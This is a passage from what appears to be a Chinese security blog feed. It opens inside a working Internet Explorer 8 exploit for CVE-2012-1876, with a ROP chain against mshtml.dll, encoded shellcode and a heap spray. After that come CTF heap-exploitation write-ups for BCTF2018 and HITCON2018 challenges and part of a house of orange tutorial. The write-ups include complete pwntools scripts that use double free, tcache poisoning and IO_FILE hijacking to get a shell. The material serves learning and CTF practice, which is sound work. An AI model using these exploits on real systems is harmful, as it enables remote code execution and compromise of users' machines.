mshtmlbase + Number(0x1308), //# ptr to &amp;VirtualProtect() [IAT mshtml.dll] mshtmlbase + Number(0x1a02a1), //# MOV EAX,DWORD PTR DS:[EAX] # RETN [mshtml.dll] mshtmlbase + Number(0xcab0e), //# XCHG EAX,ESI # RETN [mshtml.dll] mshtmlbase + Number(0x50c71b), //# POP EBP # RETN [mshtml.dll] mshtmlbase + Number(0x1613b4), //# &amp; jmp esp [mshtml.dll] mshtmlbase + Number(0xa43ab), //# POP EBX # RETN [mshtml.dll] 0x201, //# 0x00000201-&gt; ebx mshtmlbase + Number(0x27e491), //# POP EDX # RETN [mshtml.dll] 0x40, //# 0x00000040-&gt; edx mshtmlbase + Number(0x6d267), //# POP ECX # RETN [mshtml.dll] mshtmlbase + Number(0x53cc05), //# &amp;Writable location [mshtml.dll] mshtmlbase + Number(0xfb460), //# POP EDI # RETN [mshtml.dll] mshtmlbase + Number(0x424902), //# RETN (ROP NOP) [mshtml.dll] mshtmlbase + Number(0xa8005), //# POP EAX # RETN [mshtml.dll] 0x90909090, // nop mshtmlbase + Number(0x4f25d2), //# PUSHAD # RETN [mshtml.dll] 0x90909090, 0x90909090 ]; return arr; &#125; function d2u(dword) &#123; var uni = String.fromCharCode(dword &amp; 0xFFFF); uni += String.fromCharCode(dword&gt;&gt;16); return uni; &#125; function tab2uni(tab) &#123; var uni = "" for(var i=0;i&lt;tab.length;i++) &#123; uni += d2u(tab[i]); &#125; return uni; &#125; function heap_spray()&#123; //alert("spray..."); var offset = 0x354; var heap_obj = new heapLib.ie(0x10000); var code = unescape("%uc933%u8b64%u3041%u408b%u8b0c%u1470%u96ad%u8bad%u1058%u538b%u033c%u8bd3%u7852%ud303%u728b%u0320%u33f3%u41c9%u03ad%u81c3%u4738%u7465%u7550%u81f4%u0478%u6f72%u4163%ueb75%u7881%u6408%u7264%u7565%u8be2%u2472%uf303%u8b66%u4e0c%u8b49%u1c72%uf303%u148b%u038e%u33d3%u53c9%u5152%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u83d2%u0cc4%u5059%u6651%u6cb9%u516c%u7268%u2e74%u6864%u736d%u6376%uff54%u83d0%u10c4%u548b%u0424%uc933%ub951%u6d65%u6162%u8351%u246c%u6103%u6c83%u0224%u6862%u7973%u7473%u5054%ud2ff%uc483%u5510%uec8b%uec83%u3304%ubef6%u6d63%u0064%u7589%u8dfc%ufc75%uff56%u83d0%u08c4%u5a5e%ub95b%u7365%u6173%u8351%u246c%u6103%u5068%u6f72%u6863%u7845%u7469%u5354%ud2ff%uc933%uff51%u5fd0%u5b5e%uc481%u00c0%u0000%uec3b%u81e8%uff6a%u8bff%u5de5%u00c3"); var rop_chain = tab2uni(get_ropchain(mshtmlbase)); var nops = unescape("%u9090%u9090"); //NOPs var shellcode = rop_chain + code; while (nops.length &lt; 0x1000) nops+= nops; // create big block of nops var front_padding = nops.substring(0,offset); var tail_padding = nops.substring(0, 0x800 - front_padding.length - shellcode.length); shellcode = front_padding + shellcode + tail_padding; while (shellcode.length &lt; 0x40000) shellcode += shellcode; var block = shellcode.substring(2, 0x40000 - 0x21); //spray for (var i=0; i &lt; 500; i++) &#123; heap_obj.alloc(block); &#125; //alert("Spray done"); &#125; function over_trigger()&#123; var leak_col = document.getElementById("132"); leak_col.width = 943208; leak_col.span = 39; &#125; setTimeout("leak();", 400); setTimeout("get_leak()", 450); setTimeout("heap_spray();", 500) setTimeout("over_trigger();", 700); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;利用效果如文章开头所示。注：我的exp可能不能通用，毕竟我到现在还不清楚为什么我这会是width*125。。。。参考资料CVE-2012-1876 IE8 堆溢出漏洞分析CVE-2012-1876调试笔记WinDbg 漏洞分析调试cve-2012-1876漏洞详解CVE-2012-1876Microsoft Internet Explorer Col元素远程代码执行漏洞分析CVE-2012-1876分析【技术分享】32位下的堆喷射技术JavaScript中的堆漏洞利用CVE-2012-1876Microsoft Internet Explorer Col元素远程代码执行漏洞分析Windows下Shellcode编写详解]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>IE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BCTF2018 easiest writeup]]></title>
    <url>%2Fpost%2Faaf4d161.html</url>
    <content type="text"><![CDATA[并没有参加这次bctf，只有事后看看题目，这道题目不算难，不过还是学到了一些以前不是很清楚的东西，所以记录一下。题目描述题目来源： BCTF 2018知识点：fastbin_attack、IO_FILE题目提供的功能非常简单，只有add和delete123456int menu()&#123; puts("HI!"); puts("1 add "); return puts("2 delete ");&#125;保护情况：123456[*] '/home/hgy/pwn/bctf2018/easiest/easiest' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)漏洞情况12345678910111213int remove()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf("(0-11):"); __isoc99_scanf("%d", &amp;v1); if ( v1 &lt; 0 || v1 &gt; 11 ) exit(1); free(ptr[v1]); return puts("delete success !");&#125;在remove时，没有清空ptr指针，存在double free。1234int sub_400946()&#123; return system("/bin/sh");&#125;还有一个后门函数。。利用过程因为没有输出功能，所以泄露libc十分困难，改malloc_hook之类的估计是不行了。所以把目标转移到GOT表，这里有两种方法，一种是通过改GOT表的值，一种是改stdout指针。要点劫持stdout指针0x602082的值可以充当size改写stdout指针，使vtable的地址在我们的预先分配好的chunk处，并预先在chunk中伪造好vtable，将__xsputn对应偏移处写入后门函数的地址。这样，当调用printf时，最终会调用__xsputn，而执行后门函数IO_FILE结构体中_lock的值必须是可写的地址mode的值需要为0劫持GOT表0x60204d的值可以充当size，因为size只检查低4个字节。然后用system的地址往后覆写掉strtol函数的got表就行了EXP1劫持stdout指针123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./easiest')elf = ELF('./easiest')def add(index, size, content): p.recvuntil('2 delete \n') p.sendline('1') p.recvuntil('(0-11):') p.sendline(str(index)) p.recvuntil('Length:') p.sendline(str(size)) p.recvuntil('C:') p.sendline(content)def remove(index): p.recvuntil('2 delete \n') p.sendline('2') p.recvuntil('(0-11):') p.sendline(str(index))shell = 0x400946fake_chunk = 0x60207aptr = 0x6020c0add(8, 0x40, p64(shell)*8)add(1, 0x30, p64(0xdeadbeef))add(2, 0x30, p64(0xdeadbeef))add(3, 0x30, p64(0xdeadbeef))remove(1)remove(2)remove(1)add(4, 0x30, p64(fake_chunk))add(9, 0x30, p64(0))payload += "\x00"*0x16 #paddingpayload += p64(ptr - 0xd8 + 8 * 0x8)add(6, 0x30, p64(fake_chunk))add(10, 0x30, payload)p.sendline("aaa")p.interactive()EXP2劫持GOT表12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./easiest')elf = ELF('./easiest')def add(index, size, content): p.recvuntil('2 delete \n') p.sendline('1') p.recvuntil('(0-11):') p.sendline(str(index)) p.recvuntil('Length:') p.sendline(str(size)) p.recvuntil('C:') p.sendline(content)def remove(index): p.recvuntil('2 delete \n') p.sendline('2') p.recvuntil('(0-11):') p.sendline(str(index))fake_chunk = 0x602045add(1, 0x60, p64(0xdeadbeef))add(2, 0x60, p64(0xdeadbeef))add(3, 0x60, p64(0xdeadbeef))remove(1)remove(2)remove(1)add(4, 0x60, p64(fake_chunk))add(9, 0x60, p64(0))payload = "\x00" * 0xb #paddingpayload += p64(elf.symbols['system'])add(6, 0x60, p64(fake_chunk))add(10, 0x68, payload)p.sendline('/bin/sh')p.interactive()相关链接二进制文件：easiest]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>fastbin_attack</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2018 baby_tcache writeup]]></title>
    <url>%2Fpost%2F8e1cd5dc.html</url>
    <content type="text"><![CDATA[这道题和前一道children_tcache是同一个系列，然而这题难多了_(:зゝ∠)_。在网上搜了一大圈，貌似只有英文的wp，只有硬着头皮肝了。。。这题和children那题唯一的不同就是这题没有现成的输出功能，泄露变得十分困难，还好前段时间也学过了house of orange，不然wp都看不懂。。题目描述题目来源：HITCON CTF 2018知识点：tcache &amp;&amp; overlapping &amp;&amp; off_by_one &amp;&amp; IO_FILE题目界面：12345678$$$$$$$$$$$$$$$$$$$$$$$$$$$🍊 Baby Tcache 🍊$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 1. New heap $$ 2. Delete heap $ $ 3. Exit $ $$$$$$$$$$$$$$$$$$$$$$$$$$$Your choice:保护全开：123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabled漏洞情况和children_tcache的漏洞点是完全一样的，都是null byte off_by_one，这里就不再分析了。利用过程overlapping和children_tcache几乎相同的操作，通过last_remainder来绕过检查，然后overlapping。123456789101112131415161718192021222324add_7_times(0x80)del_7_times(0, 7)add_7_times(0x120)del_7_times(0, 7)add_7_times(0x200)add(0x208, 'A') #7add(0x200, 'B') #8add(0x200, 'C') #9del_7_times(0, 7)dele(8) dele(7) #remain 9add(0x108, 'A'*0x108) #remain 0 9 || 创建了一个last_remainderadd_7_times(0x80)add(0x80, 'b1') #remain 0 (1-7) 8 9del_7_times(1, 8)add(0x210, 'b2') #add 1 || remain 0 1 8 9 || 将被overlap的chunkdele(8)dele(9) #overlap泄露libc这里使用IO_FILE来进行泄露，先来看看前提知识。在puts函数内部实现中，先调用_IO_new_file_overflow123456789101112131415161718int_IO_new_file_overflow (_IO_FILE *f, int ch)&#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123; f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) &#123; : : &#125; if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, // our target f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);在这个函数中，正常的输出流程需要调用_IO_do_write，所以f-&gt;_flags &amp; _IO_NO_WRITES应该为0，f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING不能为0。然后_IO_do_write会以相同的参数调用new_do_write1234567891011121314151617181920212223static_IO_size_tnew_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; _IO_size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) /* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems. Instead, just indicate that offset (before and after) is unpredictable. */ fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; count = _IO_SYSWRITE (fp, data, to_do); // 我们的目标 : :我们的目标就是最后的_IO_SYSWRITE(fp, data, to_do)。从_IO_do_write的实参可知，fp就是FILE指针，data就是f-&gt;_IO_write_base，to_do则是f-&gt;_IO_write_ptr - f-&gt;_IO_write_base(数据长度)。因为else if中的条件构造起来十分困难，所以这里让程序流程通过if中的条件，即fp-&gt;_flags &amp; _IO_IS_APPENDING综上，需要满足的条件有12345678#define _IO_NO_WRITES 0x0008#define _IO_CURRENTLY_PUTTING 0x0800#define _IO_IS_APPENDING 0x1000_flags = 0xfbad0000 // Magic number，我也很绝望啊，没找到这个数据的解释_flags &amp; = ~_IO_NO_WRITES // _flags = 0xfbad0000_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800即flags应该为0xfbad1800所以，如果可以控制stdout的FILE结构体，将stdout-&gt;_flags设置为我们计算出的值并将stdout-&gt;_IO_write_base的最低位字节改小一点，这样就能输出内存中的一段数据，而这段数据中通常就会存在libc中的某个地址。因为只要能够修改tcache中chunk的fd指针，就能在任意地址分配chunk。在前面的overlapping中，我们已经满足了这个条件，只需要改写chunk_b2的fd指针到_IO_2_1_stdout_(stdout的FILE结构体)，然后就可以在此处分配一个chunk并改写其中的值了。因为_IO_2_1_stdout_的地址和在unsortedbin中chunk的fd指针的值只有最后3个16进制位不同，所以我们需要先在chunk_b2处通过overlapping申请并释放一个smallchunk来获取fd指针然后再重新在这分配一个chunk，通过partial overwrite修改最低两个字节，因为有半个字节无法确定，所以先随意确定一个值，通过多次运行使内存中真实值与我们确定的值发生碰撞。这里我将stdout-&gt;_IO_write_base最低位字节设置为\x08，因为刚好从该地址开始的8个字节为libc中的一个地址。1234567891011121314151617181920212223dele(1) #b2进入tcache || remain 0add_7_times(0x80)add(0x80, 'b1') #add 8del_7_times(1, 8) #remain 0 8#此时topchunk与b2重叠add_7_times(0x120)add(0x120, 'xxxx') #add 9 || 在b2处创建一个smallchunkdel_7_times(1, 8) #remain 0 8 9add(0x1000, 'xxxx') #add 1 || 防止topchunk合并dele(9) #remain 0 1 8 || 将smallchunk又释放掉，获得一个指向libc内部的fd指针add(0x50, '\x60\xa7') #add 2 || 再在b2处分配一个chunk，并partial overwrite改写fd指针，这个因为_IO_2_1_stdout_的最低3个16进制位为0x760，所以先随意确定该值为0xa760。add(0x210, 'xxxx') #add 3 || 从tcache中又将b2分配出来，此时_IO_2_1_stdout_的地址将位于tcache中payload = p64(0xfbad1800)+p64(0)*3+"\x08"add(0x210, payload) #add 4 || remain 0 1 2 3 4 8 || 在_IO_2_1_stdout_处分配chunk，然后修改其中的变量值#泄漏libclibc_base = u64(p.recvline()[:8]) - 0x3ED8B0print "libc_base : %#x" % libc_basefree_hook = libc_base + libc.symbols['__free_hook']one_gadget = libc_base + 0x4f322getshell在泄露出libc的地址后，接下来的事情就简单多了。因为在上面代码中，索引为2和3的chunk实际都为chunk_b2，所以可以通过tcache中的double free来再次修改fd值，实现在__free_hook处分配chunk，并写入one_gadget。1234567#3和2都是chunk_b2，double freedele(3)dele(2)add(0x50, p64(free_hook)) #修改fd为free_hookadd(0x50, 'xxxx') add(0x50, p64(one_gadget)) #将free_hook修改为onegadgetdele(0)我的EXP本地环境: Ubuntu 18.04.1 LTS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# coding=utf-8from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p=process('./baby_tcache')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(size, content): p.recvuntil('Your choice: ') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Data:') p.send(content)def dele(index): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def add_7_times(size): for _ in range(7): add(size, 'xxxx')def del_7_times(begin, end): for i in range(begin, end): dele(i)def main(): add_7_times(0x80) del_7_times(0, 7) add_7_times(0x120) del_7_times(0, 7) add_7_times(0x200) add(0x208, 'A') #7 add(0x200, 'B') #8 add(0x200, 'C') #9 del_7_times(0, 7) dele(8) dele(7) #remain 9 add(0x108, 'A'*0x108) #remain 0 9 || 创建了一个last_remainder add_7_times(0x80) add(0x80, 'b1') #remain 0 (1-7) 8 9 del_7_times(1, 8) add(0x210, 'b2') #add 1 || remain 0 1 8 9 || 将被overlap的chunk dele(8) dele(9) #overlap dele(1) #b2进入tcache || remain 0 add_7_times(0x80) add(0x80, 'b1') #add 8 del_7_times(1, 8) #remain 0 8 #此时topchunk与b2重叠 add_7_times(0x120) add(0x120, 'xxxx') #add 9 || 在b2处创建一个smallchunk del_7_times(1, 8) #remain 0 8 9 add(0x1000, 'xxxx') #add 1 || 防止topchunk合并 dele(9) #remain 0 1 8 || 将smallchunk又释放掉，获得一个指向libc的fd指针 add(0x50, '\x60\xa7') #add 2 || 再在b2处分配一个chunk，并partial overwrite改写fd指针 add(0x210, 'xxxx') #add 3 || 从tcache中又将b2分配出来，_IO_2_1_stdout_的地址位于tcache中 payload = p64(0xfbad1800)+p64(0)*3+"\x08" add(0x210, payload) #add 4 || remain 0 1 2 3 4 8 || 在_IO_2_1_stdout_处分配chunk，然后修改其中的变量值 #泄漏libc libc_base = u64(p.recvline()[:8]) - 0x3ED8B0 print "libc_base : %#x" % libc_base free_hook = libc_base + libc.symbols['__free_hook'] one_gadget = libc_base + 0x4f322 #3和2都是b2,double free dele(3) dele(2) add(0x50, p64(free_hook)) #修改fd为free_hook add(0x50, 'xxxx') add(0x50, p64(one_gadget)) #将free_hook修改为onegadget dele(0)if __name__ == '__main__': while(True): try: main() # gdb.attach(p) p.interactive() p.close() break except: p.close() p = process('./baby_tcache')相关链接二进制文件：baby_tcachewriteup参考：https://vigneshsrao.github.io/babytcache/https://znqt.github.io/hitcon2018-babytcache/]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>off_by_one</tag>
        <tag>IO_FILE</tag>
        <tag>overlapping</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2018 children_tcache writeup && overlapping]]></title>
    <url>%2Fpost%2Fcdad9cf7.html</url>
    <content type="text"><![CDATA[第一次参加HITCON CTF，之前在学堆利用的时候倒是做过几道往年的题，自我感觉还挺不错的，结果就爆零了23333。前几天就在网上看到了这题的writeup，一直拖到今天才拿来学习了一波，看完感觉自己是真的菜。。。题目描述题目来源：HITCON CTF 2018知识点：tcache &amp;&amp; overlapping &amp;&amp; off_by_one题目界面：123456789$$$$$$$$$$$$$$$$$$$$$$$$$$$🍊 Children Tcache 🍊$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 1. New heap $$ 2. Show heap $$ 3. Delete heap $ $ 4. Exit $ $$$$$$$$$$$$$$$$$$$$$$$$$$$Your choice:保护全开：123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabled漏洞情况new_heap函数中:1234567891011121314 printf("Size:"); size = get_num(); if ( size &gt; 0x2000 ) exit(-2); dest = (char *)malloc(size); if ( !dest ) exit(-1); printf("Data:"); get_str((__int64)&amp;s, size); strcpy(dest, &amp;s); data_list[i] = dest; size_list[i] = size; return __readfsqword(0x28u) ^ v5;&#125;因为strcpy函数在拷贝字符串时，最后的’\0’也会一起拷贝，所以当输入的字符串已经占满了所分配的内存，那最后的’\0’会往后溢出一个字节，导致了null byte off_by_one。看到null byte off_by_one，我首先就想到构造chunk overlapping，然而太菜。不够熟悉tcache以及overlap，所以到最后也没做出来笔记这题目其实不难，前面一部分都是标准的overlaping的流程，只是因为多了tcache，所以要不停的填充和清空tcache，来保证我们的chunk不受它的影响。真正利用tcache的地方只有最后的double free(tcache dup)。为了省时间就不单独分析了，直接写在exp里，赶作业要紧。。。。。补充 overlapping(2018-11-03)今天在发现这题还有一个要点我没注意到！！！！overlapping新姿势！！！(对我来说足够新2333)，所以回来补充一下overlapping常规先回顾一下常规overlapping可以看到，如果要通过null byte off_by_one构造overlapping，首先需要伪造chunk_C的prevsize(如上图第二步)，否则在分配b1的时候会corrupted size vs. prev_size。新姿势查看malloc源码可以发现，corrupted的原因在于从unsortedbin中取出chunk时会调用unlink，正是unlink中的检查导致了错误。12345678910111213else &#123; // 获取对应victim的大小 size = chunksize(victim); /* We know the first chunk in this bin is big enough to use. */ assert((unsigned long) (size) &gt;= (unsigned long) (nb)); // 计算分割后剩余的大小 remainder_size = size - nb; /* unlink */ unlink(av, victim, bck, fwd); ...&#125;而该题目在free时，会将整个chunk全部填充为0xda，所以没有办法伪造prevsize。所以该题利用过程中使用了采用了一种不需要伪造prevsize的技巧。在执行malloc时，若fastbin和smallbin中没有合适的chunk，并且请求为small chunk的话，将会首先考虑使用last_remainder。如果last_remainder是unsorted bin中的唯一一块，并且last_remainder的大小分割够还可以作为一个 chunk，那么就会从last_remainder中分割下合适大小的块。而从last_remainder分割chunk的话就不会使用到unlink，从而成功分配1234567891011121314151617181920212223242526272829303132/* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk.*/if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))&#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;&#125;所以只要能把chunk_B作为last_remainder一切就简单了。详见wpexp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697# -*- coding:utf-8 -*-from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']#context.log_level = 'debug'elf = ELF('./children_tcache')libc = ELF('./libc.so.6')p = process('./children_tcache', env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)def add(size, content): p.recvuntil('Your choice: ') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Data:') p.send(content)def show(index): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def dele(index): p.recvuntil('Your choice: ') p.sendline('3') p.recvuntil('Index:') p.sendline(str(index))def add_7_times(size): for _ in range(7): add(size, 'xxxx')def del_7_times(fr, to): for i in range(fr, to): dele(i)#现在堆的前面把这些用于填充tcache的chunk分配好，以免破坏后面堆的布局add_7_times(0x80) #0-6del_7_times(0, 7)add_7_times(0x100) #0-6，填充tcache 0x110add(0x108, '7777') #7 chunk_Aadd(0x100, '8888') #8 chunk_Badd(0x100, '9999') #9 chunk_Cdel_7_times(0, 7)dele(8) #释放chunk_B，tcache已满，放入unsortedbindele(7) #释放chunk_A，A和B会合并(重要)add_7_times(0x100) #0-6add(0x108, '7'*0x108) #7 从合并的chunk中又取回chunk_A，同时创建了last_remainder(重要)#同时通过溢出(null byte off_by_one)修改了chunk_B的size(0x110--&gt;0x100)，del_7_times(0, 7)add_7_times(0x80)add(0x80, '8888') #8 chunk_b1 从chunk_B(last_remainder)中分割下来，因为size被改，所以chunk_C的prevsize得不到维护#此处如果不是从last_remainder中分割就会出错！！！！del_7_times(0, 7)add(0x60, 'aaaa') #0 chunk_b2 将chunk_B剩下部分都取出来，chunk_C的prvesize同样没有被维护dele(8) #释放b1dele(9) #overlap!!触发从chunk_b1到topchunk的合并，其中包含了未被释放的chunk_b2 #topchunk位于chunk_b1的位置。add_7_times(0x80) #1-6 8add(0x80, 'xxxx') #9，重新分配chunk_b1，现在topchunk和chunk_b2重合del_7_times(1, 7) #回填tcache 0x90dele(8) #回填tcache 0x90，剩0(chunk_b2) 7(chunk_A) 9(chunk_b1)add(0x500, '1111') #1，该chunk和0重合add(0x120, '2222') #2，防止被topchunk合并dele(1)show(0)#泄漏libclibc_base = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0x3ebca0print "libc_base: %#x" % libc_basemalloc_hook = libc.symbols['__malloc_hook'] + libc_baseprint "malloc_hook: %#x" % malloc_hookone_gadget = libc_base + 0x10a38cprint "one_gadget: %#x" % one_gadgetadd(0x120, '1111') #1 从0x500大小的chunk中分割出0x120。0和1都指向该chunkdele(0) #放入tcachedele(1) #再次放入tcache，double freeadd(0x120, p64(malloc_hook)) #修改fd为malloc_hookadd(0x120, 'aaaa') add(0x120, p64(one_gadget)) #修改malloc_hook为one_gadgetp.recvuntil('Your choice: ') #getshellp.sendline('1')p.recvuntil('Size:')p.sendline('123')p.interactive()相关链接题目链接：children_tcacheexp参考：HITCON2018-WP-By Nu1L]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>off_by_one</tag>
        <tag>overlapping</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用学习之house of orange]]></title>
    <url>%2Fpost%2Ff8f8701e.html</url>
    <content type="text"><![CDATA[终于学到了house of orange，看了无数师傅的博客，终于马马虎虎理清了一点思路，还是得写点笔记以免忘掉。概述house of orange是来自Hitcon CTF 2016中的一道同名题目，其中使用了一种全新的攻击手段（现在也不新了2333），攻击的主要思路是利用unsorted attack修改_IO_list_all指针，并伪造_IO_FILE_plus结构体及其vtable（虚表）来劫持控制流。直接上题目好了。。。题目描述程序菜单：123456789+++++++++++++++++++++++++++++++++++++@ House of Orange @+++++++++++++++++++++++++++++++++++++ 1. Build the house 2. See the house 3. Upgrade the house 4. Give up +++++++++++++++++++++++++++++++++++++Your choice :程序保护全开_(:зゝ∠)_:12345CANARY : ENABLEDFORTIFY : ENABLEDNX : ENABLEDPIE : ENABLEDRELRO : FULL程序分析build函数：用户输入house的名字、orange的颜色和价格，并使用两个结构体保存。结构体：123400000000 house struc ; (sizeof=0x10, mappedto_6)00000000 orange dq ?00000008 name dq ?00000010 house ends123400000000 orange struc ; (sizeof=0x8, mappedto_7)00000000 price dd ?00000004 color dd ?00000008 orange ends限制了只能build四次，每次build会申请3个chunk，其中只有第二个chunk(house name)可以控制大小，且最大为0x10001234567891011121314house = (house *)malloc(0x10uLL);printf("Length of name :");size = get_num();if ( size &gt; 0x1000 ) size = 4096;house-&gt;name = (__int64)malloc(size);if ( !house-&gt;name )&#123; puts("Malloc error !!!"); exit(1);&#125;printf("Name :");get_str((void *)house-&gt;name, size);orange = (orange *)calloc(1uLL, 8uLL);upgrade函数：修改house的name、orange的颜色和价格，只能修改最近build的house。123456printf("Length of name :");v2 = get_num();if ( v2 &gt; 0x1000 ) v2 = 4096;printf("Name:");get_str((void *)qword_203068[1], v2);修改name的地方没有检查size的大小，所以存在堆溢出see函数打印house的名字、orange的价格等，同样只能打印最近build的house。漏洞分析泄露libc基址和堆地址发现程序中没有free函数，导致常规的堆利用方法都很难使用，这便是house of orange的核心之一——在没有free函数的情况下得到一个释放的堆块（unsorted bin），从而泄露数据。原理考虑这么一种情况，假设在malloc时，程序中的bins里都没有合适的chunk，同时top chunk的大小已经不够用来分配这块内存了。那么此时程序将会调用sysmalloc来向系统申请更多的空间，而我们的目的则是在sysmalloc中的_int_free()，以此来获得一块释放的堆块。1234567else&#123; void *p = sysmalloc (nb, av); //调用sysmalloc来分配内存 if (p != NULL) alloc_perturb (p, bytes); return p;&#125;对于堆来说有两种拓展方式，一是通过改变brk来拓展堆，二是通过mmap的方式。其中只有brk拓展的方式才会调用到_int_free()将老的top chunk释放掉，所以还需要满足一些条件。123456789// 如果所需分配的chunk大小大于mmap分配阈值，默认为128K，// 并且当前进程使用mmap()分配的内存块小于设定的最大值// 则将使用mmap()if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; //使用mmap() &#125;由上诉代码可知，要想使用brk拓展，需要满足chunk size &lt; 0x‭20000‬同时，在使用brk拓展之前，还会进行一系列check。12345678// 如果top chunk没有初始化，则size为0// top chunk的大小需要 &gt;= MINSIZE(有师傅的博客说在64位下是0x20)// top chunk的inuse位需要是 1// 检查是否对齐到内存页assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; pagemask) == 0));这里主要关注如何对齐到内存页。现代操作系统都是以内存页为单位进行内存管理的，一般内存页大小为4kb(0x1000)，那么top chunk的size加上top chunk的地址所得到的值是和0x1000对齐的。如：0x602020+0x20fe0=0x623000。整理以上代码，所需的条件有：分配的chunk大小小于0x‭20000，大于top chunk‬的sizetop chunk大小大于 MINSIZE（不能太小就行）top chunk的inuse为 1top chunk的大小要对齐到内存页满足了以上各种条件之后，就可以成功的调用_int_free()来释放top chunk12345/* If possible, release the rest. */if (old_size &gt;= MINSIZE)&#123; _int_free (av, old_top, 1);//调用_int_free，free old_top。&#125;此后，原先的top chunk将被放入unsorted bin中。下一次分配时，就将会从unsorted bin中切割合适的大小，而切割下来的chunk的fd和bk的值将会是libc中的地址了，同时，若该chunk是large chunk，在fd_nextsize和bk_nextsizez中还会储存堆中的地址。由此便可以完成泄露了。利用过程先build一个house，通过upgrade从name溢出到top chunk，将top chunk的大小改为0xfa1（name chunk的大小为0x20）123build(0x10, 'aaaa')payload = 'a'*0x18 + p64(0x21) + p64(0)*3 + p64(0xfa1)upgrade(0x100, payload)12345678//内存情况：0x55e0ebd68000: 0x0000000000000000 0x0000000000000021 &lt;== house0x55e0ebd68010: 0x000055e0ebd68050 0x000055e0ebd680300x55e0ebd68020: 0x0000000000000000 0x0000000000000021 &lt;== name0x55e0ebd68030: 0x6161616161616161 0x61616161616161610x55e0ebd68040: 0x6161616161616161 0x0000000000000021 &lt;== orange0x55e0ebd68050: 0x0000001f00000008 0x00000000000000000x55e0ebd68060: 0x0000000000000000 0x0000000000000fa1 &lt;== top chunk申请一个大于top 